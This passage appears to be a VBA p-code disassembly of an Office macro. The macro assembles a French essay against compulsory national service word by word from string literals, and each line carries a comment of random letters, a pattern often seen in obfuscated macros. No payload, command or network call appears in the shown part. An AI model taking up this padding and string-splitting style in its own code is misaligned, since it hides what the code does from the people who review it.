' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St e5 
' 	BoS 0x0000 
' 	Ld e5 
' 	LitStr 0x0005 "bâtir"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "s"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "effondre"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "pour"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "laisser"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "place"
' 	Add 
' 	St e5 
' 	QuoteRem 0x00DB 0x000C " prepxxdvbzn"
' Line #182:
' 	LineCont 0x0004 06 00 00 00
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0003 "aux"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "corvées"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "inutiles"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "et"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "a"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "l"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "ennui"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "bien"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "connu"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "du"
' 	Add 
' 	St d2 
' 	QuoteRem 0x00B2 0x0005 " hqwa"
' Line #183:
' 	LineCont 0x0004 04 00 00 00
' 	Ld d2 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "Service"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "National."
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "Est-il"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "possible"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "rester"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "loin"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	St d2 
' 	QuoteRem 0x00A2 0x0006 " omqdb"
' Line #184:
' 	LineCont 0x0018 19 00 00 00 3B 00 00 00 5A 00 00 00 9B 00 00 00 C5 00 00 00 E6 00 00 00
' 	Ld a4 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "la"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "personne"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "avec"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "qui"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "l"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "on"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "vie,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "ses"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "relations,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	St a4 
' 	BoS 0x0000 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0003 "ses"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "amis,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "pendant"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "10"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "mois"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "puis"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "reprendre"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "comme"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "si"
' 	Add 
' 	St a4 
' 	BoS 0x0000 
' 	Ld a4 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "rien"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "ne"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "s"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "était"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "passé"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "?"
' 	Add 
' 	St a4 
' 	BoS 0x0000 
' 	LitStr 0x0008 "Certains"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "diront"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "que"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "le"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "Service"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "National"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "fait"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "partie"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "du"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "devoir"
' 	Add 
' 	St a3 
' 	BoS 0x0000 
' 	Ld a3 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "citoyen."
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "Mais"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "servir"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "son"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "pays"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "c"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "est"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "d"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "abord"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "payer"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St a3 
' 	QuoteRem 0x0147 0x000B " ltyaxgtome"
' Line #185:
' 	LineCont 0x000C 05 00 00 00 1B 00 00 00 50 00 00 00
' 	Ld a3 
' 	LitStr 0x0003 "ses"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "impôts,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "participer"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "aux"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "frais"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "la"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "sécurité"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "sociale,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "des"
' 	Add 
' 	St a3 
' 	BoS 0x0000 
' 	Ld a3 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000B "allocations"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "chômage,"
' 	Add 
' 	St a3 
' 	QuoteRem 0x0015 0x0007 " rogufz"
' Line #186:
' 	LineCont 0x0004 39 00 00 00
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0003 "des"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "retraites,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "etc."
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "Ce"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "sont"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "bien"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "sûr"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "les"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "personnes"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "qui"
' 	Add 
' 	St a2 
' 	QuoteRem 0x002A 0x0005 " ntda"
' Line #187:
' 	LineCont 0x0018 03 00 00 00 16 00 00 00 59 00 00 00 88 00 00 00 B0 00 00 00 DC 00 00 00
' 	Ld a2 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000B "travaillent"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "qui"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "payent"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "tout"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "cela,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "et"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "les"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "actuels"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000B "sursitaires"
' 	Add 
' 	St a2 
' 	BoS 0x0000 
' 	Ld a2 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "en"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "font"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "partie."
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "Ils"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "sont"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "bien"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "plus"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "utiles"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St a2 
' 	BoS 0x0000 
' 	LitStr 0x0001 "à"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "la"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "nation"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "en"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "tant"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "que"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "cotisants"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "qu"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "en"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "tant"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "qu"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "appelés"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St c2 
' 	BoS 0x0000 
' 	Ld c2 
' 	LitStr 0x0002 "du"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000B "contingent."
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St c2 
' 	QuoteRem 0x0038 0x000C " ngxtogztfmr"
' Line #188:
' 	LineCont 0x000C 11 00 00 00 27 00 00 00 42 00 00 00
' 	LitStr 0x0002 "Le"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "service"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "national"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "prétends"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "aujourd"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "hui"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "que"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "la"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "vie"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "reprends"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "son"
' 	Add 
' 	St d1 
' 	QuoteRem 0x0012 0x0010 " fepgrteszawkwsa"
' Line #189:
' 	LineCont 0x0008 AD 00 00 00 B3 00 00 00
' 	Ld d1 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "cour"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000B "normalement"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "après"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "10"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "mois"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "service"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "au"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "milieu"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St d1 
' 	BoS 0x0000 
' 	Ld d1 
' 	LitStr 0x0001 "d"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "un"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "Contrat"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "Travail."
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "C"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "est"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "bien"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "sûr"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "un"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "véritable"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "utopisme"
' 	Add 
' 	St d1 
' 	BoS 0x0000 
' 	Ld d1 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "et"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "le"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St d1 
' 	BoS 0x0000 
' 	LitStr 0x0005 "bilan"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "ne"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "se"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "résume"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "pas"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "à"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "une"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "perte"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "10"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "mois"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St c3 
' 	QuoteRem 0x00C8 0x0007 " dzycin"
' Line #190:
' 	LineCont 0x001C 05 00 00 00 1A 00 00 00 3C 00 00 00 4D 00 00 00 5B 00 00 00 8C 00 00 00 95 00 00 00
' 	Ld c3 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "temps:"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "C"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "est"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "une"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "véritable"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000B "catastrophe"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "pour"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "la"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "situation"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000B "financière,"
' 	Add 
' 	St c3 
' 	BoS 0x0000 
' 	Ld c3 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "matérielle"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "et"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "morale"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "l"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "individu,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "qui"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "aura"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "des"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000C "répercutions"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St c3 
' 	QuoteRem 0x000A 0x0006 " anfnz"
' Line #191:
' 	LineCont 0x0008 16 00 00 00 1F 00 00 00
' 	Ld c3 
' 	LitStr 0x000C "regrettables"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "et"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "durables."
' 	Add 
' 	St c3 
' 	BoS 0x0000 
' 	LitStr 0x0003 "Ils"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "sont"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "environ"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "250"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "000"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "jeunes"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "citoyens,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000C "sursitaires,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "à"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "devoir"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St c1 
' 	QuoteRem 0x00AF 0x000D " zgtxqdzagpti"
' Line #192:
' 	LineCont 0x0004 13 00 00 00
' 	Ld c1 
' 	LitStr 0x0009 "effectuer"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "notre"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "service"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "militaire."
